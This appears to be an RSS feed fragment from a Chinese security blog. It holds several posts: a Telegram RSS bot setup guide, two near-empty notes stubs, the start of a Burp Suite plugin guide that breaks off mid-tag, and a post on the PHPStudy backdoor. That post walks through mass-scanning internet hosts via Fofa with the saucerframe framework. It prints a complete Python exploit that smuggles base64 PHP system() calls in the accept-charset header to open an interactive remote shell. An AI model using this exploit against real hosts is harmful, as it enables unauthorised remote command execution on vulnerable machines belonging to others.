    <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>为了积累在工作中碰到的一些漏洞以及在一些文章中看到的一些漏洞，决定采用文本的方式记录下来，一来方便自己查看，二来也可以方便自己以后写报告。</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20191011165501.png" class="lozad"></p><a id="more"></a><h1 id="0x01-web漏洞"><a href="#0x01-web漏洞" class="headerlink" title="0x01 web漏洞"></a>0x01 web漏洞</h1><h1 id="0x02-主机漏洞"><a href="#0x02-主机漏洞" class="headerlink" title="0x02 主机漏洞"></a>0x02 主机漏洞</h1><h1 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h1><h1 id="0x04"><a href="#0x04" class="headerlink" title="0x04"></a>0x04</h1><p>### </p><hr>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h1&gt;&lt;p&gt;为了积累在工作中碰到的一些漏洞以及在一些文章中看到的一些漏洞，决定采用文本的方式记录下来，一来方便自己查看，二来也可以方便自己以后写报告。&lt;/p&gt;
&lt;p&gt;&lt;img alt data-src=&quot;https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20191011165501.png&quot; class=&quot;lozad&quot;&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="渗透测试" scheme="https://www.mad-coding.cn/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
      <category term="漏洞库" scheme="https://www.mad-coding.cn/tags/%E6%BC%8F%E6%B4%9E%E5%BA%93/"/>
    
  </entry>
  
  <entry>
    <title>使用telegram搭建一个rss订阅机器人</title>
    <link href="https://www.mad-coding.cn/2019/10/10/%E4%BD%BF%E7%94%A8telegram%E6%90%AD%E5%BB%BA%E4%B8%80%E4%B8%AArss%E8%AE%A2%E9%98%85%E6%9C%BA%E5%99%A8%E4%BA%BA/"/>
    <id>https://www.mad-coding.cn/2019/10/10/使用telegram搭建一个rss订阅机器人/</id>
    <published>2019-10-10T06:27:20.000Z</published>
    <updated>2019-10-11T08:58:01.796Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 +前言"></a>0x00 +前言</h1><p>一直想打造一个可以订阅一些好的博客或者网站直接的东西，但是很多免费的RSS阅读器广告特别多，所以就很少打开了，今天看到一篇文章说可以利用telegram+vps搭建一个RSS订阅的机器人，一下子吸引了我，今天就把这个技能分享给大家</p><a id="more"></a><h1 id="0x01-前期准备"><a href="#0x01-前期准备" class="headerlink" title="0x01 前期准备"></a>0x01 前期准备</h1><blockquote><p>环境准备：</p><ol><li>一个vps：Ubuntu 16系统</li><li>telegram</li><li>科学**</li><li>xshell或者finalshell</li></ol></blockquote><h2 id="1-1-vps的购买"><a href="#1-1-vps的购买" class="headerlink" title="1.1 vps的购买"></a>1.1 vps的购买</h2><p>网址推荐：<a href="https://virmach.com/" target="_blank" rel="noopener">virmach</a> ;<a href="https://vp.xinping04.cn/bwg/" target="_blank" rel="noopener">搬瓦工</a></p><h2 id="1-2-telegram下载安装"><a href="#1-2-telegram下载安装" class="headerlink" title="1.2 telegram下载安装"></a>1.2 telegram下载安装</h2><p>Windows：<a href="https://telegram-for-desktop.en.softonic.com/" target="_blank" rel="noopener">传送门</a></p><p>Android：在Google play中自行下载</p><h2 id="1-3-科学-搭建"><a href="#1-3-科学-搭建" class="headerlink" title="1.3 科学**搭建"></a>1.3 科学**搭建</h2><p>教程：<a href="https://www.mad-coding.cn/2019/09/20/9元钱搭建一个自己的VPN/">传送门</a></p><h1 id="0x02-搭建RSS订阅机器人"><a href="#0x02-搭建RSS订阅机器人" class="headerlink" title="0x02 搭建RSS订阅机器人"></a>0x02 <strong>搭建RSS订阅机器人</strong></h1><h2 id="2-1-申请机器人"><a href="#2-1-申请机器人" class="headerlink" title="2.1 申请机器人"></a>2.1 <strong>申请机器人</strong></h2><p>首先需要申请一个Telegram机器人，非常简单，直接对话Telegram机器人之父（@BotFather），发送/newbot给它，之后输入你的机器人的名字，注意需要以bot结尾（例如我的是kangrss_bot），之后你的机器人就创建好了，并且会给你一个<strong>HTTP API TOKEN</strong>：</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20191010144634.png" class="lozad"></p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20191010144745.png" class="lozad"></p><p>记住这个token，待会需要用到</p><h2 id="2-2-搭建RSS订阅"><a href="#2-2-搭建RSS订阅" class="headerlink" title="2.2 搭建RSS订阅"></a>2.2 搭建RSS订阅</h2><p>搭建的RSS订阅机器人是基于开源软件rssbot的，一个开源的Telegram<br>RSS机器人，项目地址：<a href="https://github.com/iovxw/rssbot。" target="_blank" rel="noopener">https://github.com/iovxw/rssbot。</a></p><blockquote><p>还有一个听说也挺好用，但是我还没有用过</p><p><a href="https://github.com/indes/flowerss-bot" target="_blank" rel="noopener">https://github.com/indes/flowerss-bot</a></p></blockquote><h3 id="2-2-1【方法一】"><a href="#2-2-1【方法一】" class="headerlink" title="2.2.1【方法一】"></a>2.2.1【方法一】</h3><p>首先得登录VPS，然后安装相关依赖。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#CentOS系统 </span></span><br><span class="line">yum -y update &amp;&amp; yum -y install gcc make openssl* pkg* libssl* screen curl </span><br><span class="line"><span class="comment">#Ubuntu、Debian系统</span></span><br><span class="line">apt-get -y update &amp;&amp; apt-get -y install gcc make openssl pkg-config libssl-dev screen curl</span><br></pre></td></tr></table></figure><p>安装Rust Nightly</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl https://sh.rustup.rs -sSf | sh</span><br></pre></td></tr></table></figure><p>安装rssbot</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">wget https://github.com/iovxw/rssbot/archive/v1.4.2.tar.gz</span><br><span class="line">tar xvf v1.4.2.tar.gz</span><br><span class="line"><span class="built_in">cd</span> rssbot-1.4.2</span><br><span class="line">cargo build --release</span><br></pre></td></tr></table></figure><h3 id="2-2-2-【方法二】"><a href="#2-2-2-【方法二】" class="headerlink" title="2.2.2 【方法二】"></a>2.2.2 【方法二】</h3><p>直接下载编译好的rssbot.<a href="https://github.com/iovxw/rssbot/releases" target="_blank" rel="noopener">传送门</a></p><p>下载下来Linux版本的，然后使用远程终端连接工具xshell或finalshell来连接vps，将本地的rssbot文件上传到vps中，</p><h2 id="2-3-运行rssbot"><a href="#2-3-运行rssbot" class="headerlink" title="2.3 运行rssbot"></a>2.3 运行rssbot</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mkdir RSS <span class="comment">#创建RSS文件夹</span></span><br><span class="line"><span class="built_in">cd</span> RSS</span><br><span class="line">chmod +x rssbot <span class="comment">#服务rssbot执行权限</span></span><br><span class="line">apt-get install screen</span><br><span class="line">./rssbot DATAFILE TELEGRAM-BOT-TOKEN</span><br></pre></td></tr></table></figure><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20191010145632.png" class="lozad"></p><p>然后按Ctrl + A + D 退出 screen （这样会后台运行）</p><p>使用下面的命令可以进入刚才启动服务的screen</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">screen -R rssbot</span><br></pre></td></tr></table></figure><p>最后我们就可以使用机器人了！</p><h1 id="0x03-订阅网站"><a href="#0x03-订阅网站" class="headerlink" title="0x03 订阅网站"></a>0x03 订阅网站</h1><p><code>rssbot</code>的指令如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">/rss       - 显示当前订阅的 RSS 列表，加 raw 参数显示链接</span><br><span class="line">/sub       - 订阅一个 RSS: /sub http://example.com/feed.xml</span><br><span class="line">/unsub     - 退订一个 RSS: /unsub http://example.com/feed.xml</span><br><span class="line">/unsubthis - 使用此命令回复想要退订的 RSS 消息即可退订, 不支持 Channel</span><br><span class="line">/export    - 导出为 OPML</span><br></pre></td></tr></table></figure><p>【示例】</p><p>订阅：</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20191010150314.png" class="lozad"></p><p>退订：</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20191010150348.png" class="lozad"></p><p>查看订阅的地址</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20191010150438.png" class="lozad"></p><h1 id="0x04-参考链接"><a href="#0x04-参考链接" class="headerlink" title="0x04 参考链接"></a>0x04 参考链接</h1><p><a href="https://51.ruyo.net/13304.html" target="_blank" rel="noopener">https://51.ruyo.net/13304.html</a></p><p><a href="https://www.moerats.com/archives/566/" target="_blank" rel="noopener">https://www.moerats.com/archives/566/</a></p><p>### </p><hr>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 +前言&quot;&gt;&lt;/a&gt;0x00 +前言&lt;/h1&gt;&lt;p&gt;一直想打造一个可以订阅一些好的博客或者网站直接的东西，但是很多免费的RSS阅读器广告特别多，所以就很少打开了，今天看到一篇文章说可以利用telegram+vps搭建一个RSS订阅的机器人，一下子吸引了我，今天就把这个技能分享给大家&lt;/p&gt;
    
    </summary>
    
      <category term="教程" scheme="https://www.mad-coding.cn/categories/%E6%95%99%E7%A8%8B/"/>
    
    
      <category term="telegram" scheme="https://www.mad-coding.cn/tags/telegram/"/>
    
      <category term="机器人" scheme="https://www.mad-coding.cn/tags/%E6%9C%BA%E5%99%A8%E4%BA%BA/"/>
    
  </entry>
  
  <entry>
    <title>phpstudy后门检测及利用</title>
    <link href="https://www.mad-coding.cn/2019/10/09/phpstudy%E5%90%8E%E9%97%A8%E6%A3%80%E6%B5%8B%E5%8F%8A%E5%88%A9%E7%94%A8/"/>
    <id>https://www.mad-coding.cn/2019/10/09/phpstudy后门检测及利用/</id>
    <published>2019-10-09T03:43:02.000Z</published>
    <updated>2019-10-11T09:00:44.925Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>前几天爆出了PHPstudy被黑客入侵，导致安装包被植入后门，所有下载该工具的人，都有可能被人直接远程控制。今天来给大家直接演示批量扫描存在PHPstudy后门的主机，然后对存在后门的主机直接getshell。</p><a id="more"></a><h1 id="0x01-前期准备"><a href="#0x01-前期准备" class="headerlink" title="0x01 前期准备"></a>0x01 前期准备</h1><blockquote><p>【环境需求】</p><p>kali Linux渗透测试系统</p><p>saucerframe攻击框架</p><p>PHPstudy利用脚本</p></blockquote><h2 id="1-1-kali-Linux系统安装"><a href="#1-1-kali-Linux系统安装" class="headerlink" title="1.1 kali Linux系统安装"></a>1.1 kali Linux系统安装</h2><p>出门右拐百度，一大堆教程</p><h2 id="1-2-saucerframe攻击框架的安装"><a href="#1-2-saucerframe攻击框架的安装" class="headerlink" title="1.2 saucerframe攻击框架的安装"></a>1.2 saucerframe攻击框架的安装</h2><p>框架GitHub地址：<a href="https://github.com/saucer-man/saucerframe" target="_blank" rel="noopener">传送门</a></p><p>【安装步骤】</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/saucer-man/saucerframe.git </span><br><span class="line"><span class="built_in">cd</span> saucerframe</span><br><span class="line">pip install -r requirement.txt</span><br></pre></td></tr></table></figure><blockquote><p>saucerframe框架需要python3的环境。</p></blockquote><p>【使用说明】</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1. 指定poc脚本(必需,支持同时指定多个poc)</span></span><br><span class="line">-s redis_unauth,mongodb_unauth</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. 指定目标(必需)</span></span><br><span class="line">-iU www.xxx.com  单个目标</span><br><span class="line">-iF target.txt  从文本中加载</span><br><span class="line">-iR 192.168.1.1-192.168.2.100  根据ip地址范围加载</span><br><span class="line">-iN 192.168.1.0/24  根据网段加载</span><br><span class="line">-aZ <span class="string">"redis"</span>  ZoomEye api加载</span><br><span class="line">-aS <span class="string">"redis"</span>  Shodan api加载</span><br><span class="line">-aC <span class="string">"redis"</span>  Censys api加载</span><br><span class="line">-aF <span class="string">"redis"</span>  Fofa api加载</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3. 其他(可选)</span></span><br><span class="line">-h  查看帮助信息</span><br><span class="line">-t 300  并发数(默认100)</span><br><span class="line">--proxy socks5://127.0.0.1:1080  使用sock5代理</span><br><span class="line">-o result.txt  指定输出文件</span><br><span class="line">-v 4 指定终端输出详细级别(1-5, 默认为2)</span><br><span class="line">--show  查看所有poc</span><br><span class="line">-eT  并发采用多线程方式</span><br><span class="line">-eG  并发采用协程方式(默认)</span><br></pre></td></tr></table></figure><h2 id="1-3-PHPstudy后门利用脚本"><a href="#1-3-PHPstudy后门利用脚本" class="headerlink" title="1.3 PHPstudy后门利用脚本"></a>1.3 PHPstudy后门利用脚本</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- encoding: utf-8 -*-</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">@File    :   PHPStudy_Backdoor.py</span></span><br><span class="line"><span class="string">@Time    :   2019/09/23 19:17:02</span></span><br><span class="line"><span class="string">@Author  :   fuhei </span></span><br><span class="line"><span class="string">@Version :   1.0</span></span><br><span class="line"><span class="string">@Blog    :   http://www.lovei.org</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">'User-Agent'</span>: <span class="string">'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36 Edg/77.0.235.27'</span>,</span><br><span class="line">    <span class="string">'Sec-Fetch-Mode'</span>: <span class="string">'navigate'</span>,</span><br><span class="line">    <span class="string">'Sec-Fetch-User'</span>: <span class="string">'?1'</span>,</span><br><span class="line">    <span class="string">'Accept'</span>: <span class="string">'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3'</span>,</span><br><span class="line">    <span class="string">'Sec-Fetch-Site'</span>: <span class="string">'none'</span>,</span><br><span class="line">    <span class="string">'accept-charset'</span>: <span class="string">'ZXhpdCgnZnVoZWk2NjYnKTs='</span>,</span><br><span class="line">    <span class="string">'Accept-Encoding'</span>: <span class="string">'gzip,deflate'</span>,</span><br><span class="line">    <span class="string">'Accept-Language'</span>: <span class="string">'zh-CN,zh;q=0.9'</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">(url, command=<span class="string">"whoami"</span>)</span>:</span></span><br><span class="line">    command = <span class="string">"system(\""</span> + command + <span class="string">"\");"</span></span><br><span class="line">    command = base64.b64encode(command.encode(<span class="string">'utf-8'</span>))</span><br><span class="line">    headers[<span class="string">'accept-charset'</span>] = str(command, <span class="string">'utf-8'</span>)</span><br><span class="line">    user = result = requests.get(url, headers=headers, verify=<span class="literal">False</span>).text.split(<span class="string">'&lt;!'</span>)[<span class="number">0</span>].strip(<span class="string">'\r\n'</span>)</span><br><span class="line">    print(user)</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>):</span><br><span class="line">        command = input(user+<span class="string">"@fuhei$ "</span>)</span><br><span class="line">        <span class="keyword">if</span> command == <span class="string">'exit'</span> <span class="keyword">or</span> command  == <span class="string">'quit'</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            command = <span class="string">"system(\""</span> + command + <span class="string">"\");"</span></span><br><span class="line">            command = base64.b64encode(command.encode(<span class="string">'utf-8'</span>))</span><br><span class="line">            headers[<span class="string">'accept-charset'</span>] = str(command, <span class="string">'utf-8'</span>)</span><br><span class="line">            result = requests.get(url, headers=headers, verify=<span class="literal">False</span>)</span><br><span class="line">            result.encoding = <span class="string">"GBK"</span></span><br><span class="line">            print(result)</span><br><span class="line">            result = result.text.split(<span class="string">'&lt;!'</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">'Cannot execute a blank command in'</span> <span class="keyword">in</span> result[<span class="number">0</span>]:</span><br><span class="line">                <span class="keyword">pass</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                print(result[<span class="number">0</span>], end=<span class="string">""</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check</span><span class="params">(url)</span>:</span></span><br><span class="line">    result = requests.get(url, headers=headers, verify=<span class="literal">False</span>)</span><br><span class="line">    <span class="keyword">if</span> result.status_code == <span class="number">200</span> <span class="keyword">and</span> <span class="string">'fuhei666'</span> <span class="keyword">in</span> result.text:</span><br><span class="line">        print(<span class="string">"[+] Remote code execution vulnerability exists at the target address"</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">"[-] There is no remote code execution vulnerability in the target address"</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="keyword">if</span> len(sys.argv) == <span class="number">2</span>:     </span><br><span class="line">        url = sys.argv[<span class="number">1</span>]</span><br><span class="line">        <span class="keyword">if</span> check(url):</span><br><span class="line">            exp(url)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">"[!] Usage python3 PHPStudy_Backdoor.py http://www.lovei.org/"</span>)</span><br></pre></td></tr></table></figure><h1 id="0x02-开炮"><a href="#0x02-开炮" class="headerlink" title="0x02 开炮"></a>0x02 开炮</h1><p>进入saucerframe文件夹，查看可利用的PHPstudy后门扫描脚本。</p><blockquote><p>python saucerframe.py –show</p></blockquote><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20191009142554.png" class="lozad"></p><blockquote><p>python saucerframe.py -s phpstudy_backdoor.py -aF “phpstudy”</p></blockquote><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20191009142952.png" class="lozad"></p><blockquote><p>python phpstudy_getshell.py <a href="http://IP地址" target="_blank" rel="noopener">http://IP地址</a></p></blockquote><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20191009152327.png" class="lozad"></p><blockquote><p>免责声明：</p><p><strong>本文意在讨论使用工具来应对软件研发领域中，日益增长的安全性质量测试需求。本文涉及到的工具不可被用于攻击目的**</strong>，本人概不承担一切后果。**</p></blockquote><hr>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h1&gt;&lt;p&gt;前几天爆出了PHPstudy被黑客入侵，导致安装包被植入后门，所有下载该工具的人，都有可能被人直接远程控制。今天来给大家直接演示批量扫描存在PHPstudy后门的主机，然后对存在后门的主机直接getshell。&lt;/p&gt;
    
    </summary>
    
      <category term="安全工具" scheme="https://www.mad-coding.cn/categories/%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7/"/>
    
    
      <category term="PHPstudy后门" scheme="https://www.mad-coding.cn/tags/PHPstudy%E5%90%8E%E9%97%A8/"/>
    
  </entry>
  
  <entry>
    <title>python爬虫学习笔记（一）</title>
    <link href="https://www.mad-coding.cn/2019/10/08/python%E7%88%AC%E8%99%AB%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E4%B8%80%EF%BC%89/"/>
    <id>https://www.mad-coding.cn/2019/10/08/python爬虫学习笔记（一）/</id>
    <published>2019-10-08T03:28:29.000Z</published>
    <updated>2019-10-11T09:04:52.449Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>为了记录自己的学习进度，并且将自己学习的内容巩固消化，决定将学习的知识用笔记的方式记录下来。</p><a id="more"></a><h1 id="0x01-python初识"><a href="#0x01-python初识" class="headerlink" title="0x01 python初识"></a>0x01 python初识</h1><h2 id="1-1-python简介"><a href="#1-1-python简介" class="headerlink" title="1.1 python简介"></a>1.1 python简介</h2><p>Python 是 一 门 <strong>面 向 对 象 的</strong> 、 <strong>解 释 型</strong> 的 编 程 语 言 。<br>目 前 Python 常 见 的 版 本 有 Python2. X 和 Python3. X ， 总 结 起 来 ，<br>Python3. X 各 方 面 更 成 熟 完 善 些 ， Python2. X 处 理 速 度 更 快 一 些 ，<br>但 Python3. x 不 断 再 进 步 ， 肯 定 会 是 主 流 。<br>Python 的 优 点 有 很 多 ， 比 如 简 洁 、 易 学 、 几 乎 全 能 、 支 持 面<br>向 对 象 等 。 </p><blockquote><p>【知识拓展】</p><p>OOP—面向对象的编程语言</p><p><a href="https://www.cnblogs.com/yimengxianzhi/p/7802021.html" target="_blank" rel="noopener">https://www.cnblogs.com/yimengxianzhi/p/7802021.html</a></p><p>面向对象的编程语言适合做大型的项目，</p><p>面向过程的编程语言适合做中小型的项目。</p></blockquote><h2 id="1-2-python能做什么"><a href="#1-2-python能做什么" class="headerlink" title="1.2 python能做什么"></a>1.2 python能做什么</h2><ol><li>Python 能 做 什 么 </li><li>数 据 分 析 与 挖 掘 </li><li>黑 客 逆 向 编 程 </li><li>网 络 爬 虫 </li><li>机 器 学 习 </li><li>开 发 WEB 项 目 </li><li>开 发 游 戏 </li><li>自 动 化 运 维 </li><li>…</li></ol><h1 id="0x02-python基础语法"><a href="#0x02-python基础语法" class="headerlink" title="0x02 python基础语法"></a>0x02 python基础语法</h1><h2 id="2-1-输出"><a href="#2-1-输出" class="headerlink" title="2.1 输出"></a>2.1 输出</h2><p>2.x输出：print “hello world”</p><p>3.x输出：print(“hello world”)</p><h2 id="2-2-注释"><a href="#2-2-注释" class="headerlink" title="2.2 注释"></a>2.2 注释</h2><ol><li><p>单行注释：#</p></li><li><p>多行注释：三引号注释法</p></li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#print("hello world")</span></span><br><span class="line">···</span><br><span class="line">print(<span class="string">"hello world"</span>)</span><br><span class="line">print(<span class="string">"hello world"</span>)</span><br><span class="line">print(<span class="string">"hello world"</span>)</span><br><span class="line">···</span><br></pre></td></tr></table></figure><h2 id="2-3-标识符"><a href="#2-3-标识符" class="headerlink" title="2.3 标识符"></a>2.3 标识符</h2><h2 id="2-4-变量"><a href="#2-4-变量" class="headerlink" title="2.4 变量"></a>2.4 变量</h2><h2 id="2-5-数据类型"><a href="#2-5-数据类型" class="headerlink" title="2.5 数据类型"></a>2.5 数据类型</h2><h2 id="2-6-运算符"><a href="#2-6-运算符" class="headerlink" title="2.6 运算符"></a>2.6 运算符</h2><h2 id="2-7-缩进"><a href="#2-7-缩进" class="headerlink" title="2.7 缩进"></a>2.7 缩进</h2><h1 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h1><h1 id="0x04"><a href="#0x04" class="headerlink" title="0x04"></a>0x04</h1><p>### </p><hr>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h1&gt;&lt;p&gt;为了记录自己的学习进度，并且将自己学习的内容巩固消化，决定将学习的知识用笔记的方式记录下来。&lt;/p&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>burpsuite常用插件推荐与使用（不断跟新中）</title>
    <link href="https://www.mad-coding.cn/2019/10/04/burpsuite%E5%B8%B8%E7%94%A8%E6%8F%92%E4%BB%B6%E6%8E%A8%E8%8D%90%E4%B8%8E%E4%BD%BF%E7%94%A8/"/>
    <id>https://www.mad-coding.cn/2019/10/04/burpsuite常用插件推荐与使用/</id>
    <published>2019-10-04T02:36:43.000Z</published>
    <updated>2019-10-11T09:06:02.520Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><a id="more"></a><h1 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h1><h1 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h1><h1 id="0x03-jsEncrypter"><a href="#0x03-jsEncrypter" class="headerlink" title="0x03 jsEncrypter"></a>0x03 jsEncrypter</h1><h2 id="3-1-介绍"><a href="#3-1-介绍" class="headerlink" title="3.1 介绍"></a>3.1 介绍</h2><p>jsEncrypter是一个<a href="https://www.uedbox.com/post/tag/burpsuite/" target="_blank" rel="noopener">BurpSuite</a>插件，使用phantomjs调用前端<a href="https://www.uedbox.com/post/tag/加密/" target="_blank" rel="noopener">加密</a>函数对数据进行加密，方便对加密数据输入点进行fuzz。</p><h2 id="3-2-jsEncrypter下载"><a href="#3-2-jsEncrypter下载" class="headerlink" title="3.2 jsEncrypter下载"></a>3.2 jsEncrypter下载</h2><p>1：直接在<a href="https://github.com/c0ny1/jsEncrypter/releases" target="_blank" rel="noopener">releases</a>下载</p><p>2：自行编译：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/c0ny1/jsEncrypter.git</span><br><span class="line">mvn package</span><br></pre></td></tr></table></figure><p>3: 编译好的：<a href="http://pan.mad-coding.cn/%E5%B7%A5%E5%85%B7/jsEncrypter-0.3.jar" target="_blank" rel="noopener">传送门</a> </p><h2 id="3-3-安装插件"><a href="#3-3-安装插件" class="headerlink" title="3.3 安装插件"></a>3.3 安装插件</h2><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20191009175432.png" class="lozad"></p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20191009175535.png" class="lozad"></p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20191009175601.png" class="lozad"></p><h2 id="3-4-jsEncrypter插件使用"><a href="#3-4-jsEncrypter插件使用" class="headerlink" title="3.4 jsEncrypter插件使用"></a>3.4 jsEncrypter插件使用</h2><h3 id="3-4-1-运行靶机"><a 